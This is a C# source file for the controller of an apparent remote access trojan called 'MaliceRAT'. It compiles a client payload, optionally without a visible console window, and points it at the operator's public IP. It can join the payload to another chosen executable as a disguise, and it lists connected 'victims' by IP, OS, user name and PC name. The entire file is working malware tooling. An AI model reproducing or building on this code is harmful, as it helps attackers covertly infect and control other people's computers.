using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Windows.Forms;
using System.Reflection;
using Microsoft.CSharp;
using System.Threading.Tasks;
using System.Drawing;
using System.Drawing.Imaging;
using MaliceRAT.RatServer;

namespace MaliceRAT
{
    public partial class Main : Form
    {
        readonly Server server = new Server();
        
        public Main()
        {
            InitializeComponent();

            server.StartServer();
            server.InfoReceived += Server_InfoReceived;
            server.ClientDisconnected += Server_ClientDisconnected;
        }
       private async Task<string> CompileClientExeAsync()
        {
            string sourceCode;

            try
            {
                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MaliceRAT.RatClient.Client.cs"))
                {
                    if (stream == null)
                    {
                        throw new ArgumentNullException("stream", "Stream cannot be null. Check the resource name and ensure it is correctly embedded.");
                    }
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        sourceCode = reader.ReadToEnd();
                    }
                }
                if(gunaForwardedPorts.Checked) {
                    string publicIP = await Utilities.GetPublicIPAddress();
                    sourceCode = sourceCode.Replace("127.0.0.1", publicIP);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error reading embedded source file: {ex.Message}");
                return null;
            }

            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = Path.Combine(Application.StartupPath, "client.exe"),
                CompilerOptions = gunaHideConsole.Checked ? "/optimize /target:winexe" : "/optimize",
                ReferencedAssemblies = {
                    "System.dll",
                    "System.Core.dll",
                    "System.Net.Sockets.dll",
                    "Newtonsoft.Json.dll",
                    "mscorlib.dll",
                    "System.Memory.dll",
                    "Microsoft.CSharp.dll",
                    "System.Runtime.dll",
                    "System.Runtime.CompilerServices.Unsafe.dll"
                }
            };

            CompilerResults results = provider.CompileAssemblyFromSource(parameters, sourceCode);
            if (results.Errors.HasErrors)
            {
                string errorMessage = "Compilation error: ";
                foreach (CompilerError error in results.Errors)
                {
                    errorMessage += $"\nLine {error.Line}, Column {error.Column}: {error.ErrorText}";
                }
                
                MessageBox.Show(errorMessage);

                return null;
            }
            return parameters.OutputAssembly;
        }
        private byte[] CombineExeFiles(string exe1, string exe2)
        {
            byte[] exe1Bytes = File.ReadAllBytes(exe1);
            byte[] exe2Bytes = File.ReadAllBytes(exe2);
            byte[] combinedBytes = new byte[exe1Bytes.Length + exe2Bytes.Length];

            Buffer.BlockCopy(exe1Bytes, 0, combinedBytes, 0, exe1Bytes.Length);
            Buffer.BlockCopy(exe2Bytes, 0, combinedBytes, exe1Bytes.Length, exe2Bytes.Length);

            return combinedBytes;
        }
        private async void buildButton_Click(object sender, EventArgs e)
        {
            string exePath = await CompileClientExeAsync();

            if (exePath != null)
            {
                if (gunaCheckBox2.Checked && !string.IsNullOrEmpty(textBox1.Text))
                {
                    byte[] combinedBytes = CombineExeFiles(exePath, textBox1.Text);
                    File.WriteAllBytes(Path.Combine(Application.StartupPath, "CombinedClient.exe"), combinedBytes);
                }
                else
                {
                    File.Copy(exePath, Path.Combine(Application.StartupPath, "CombinedClient.exe"), true);
                }
                MessageBox.Show("Compilation successful: " + exePath);
                if (gunaOpenFolder.Checked)
                {
                    System.Diagnostics.Process.Start("explorer.exe", Application.StartupPath);
                }
            }
        }
        private void gunaButton1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable Files (*.exe)|*.exe";
                openFileDialog.Title = "Select an Executable File";

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string selectedFilePath = openFileDialog.FileName;
                    textBox1.Text = selectedFilePath;
                }
            }
        }
        private async Task AddVictimToGrid(Victim victim) {
            if (InvokeRequired) {
                Invoke(new Action(async () => await AddVictimToGrid(victim)));
                return;
            }

            int rowIndex = guna2DataGridView1.Rows.Add();
            DataGridViewRow row = guna2DataGridView1.Rows[rowIndex];

            row.Cells["ID"].Value = victim.Id;
            row.Cells["IP"].Value = victim.IP;
            row.Cells["OS"].Value = victim.OS;
            row.Cells["USER"].Value = victim.User;
            row.Cells["PC"].Value = victim.PC;

            string ipToUse = victim.IP == "127.0.0.1" ? await Utilities.GetPublicIPAddress() : victim.IP;
            Image flagImage = await Utilities.GetFlagFromIP(ipToUse);

            row.Cells["Flag"].Value = flagImage;

            for (int i = 0; i < guna2DataGridView1.Columns.Count; i++) {
                if(row.Cells[i].Value == null) {
                    row.Cells[i].Value = "N/A";
                }
            }
        }
        public void RemoveVictimFromGrid(Victim victim) {
            if (guna2DataGridView1.InvokeRequired) {
                guna2DataGridView1.Invoke(new Action(() => {
                    RemoveVictimById(victim.Id);
                }));
            } else {
                RemoveVictimById(victim.Id);
            }
        }
        private void RemoveVictimById(int id) {
            foreach (DataGridViewRow row in guna2DataGridView1.Rows) {
                if (row.Cells["ID"].Value != null && (int)row.Cells["ID"].Value == id) {
                    guna2DataGridView1.Rows.Remove(row);
                    break;
                }
            }
        }
        private async void Server_InfoReceived(Victim client) 
        {
            await AddVictimToGrid(client);
        }
        private void Server_ClientDisconnected(Victim client) 
        {
            RemoveVictimFromGrid(client);
        }
    }
}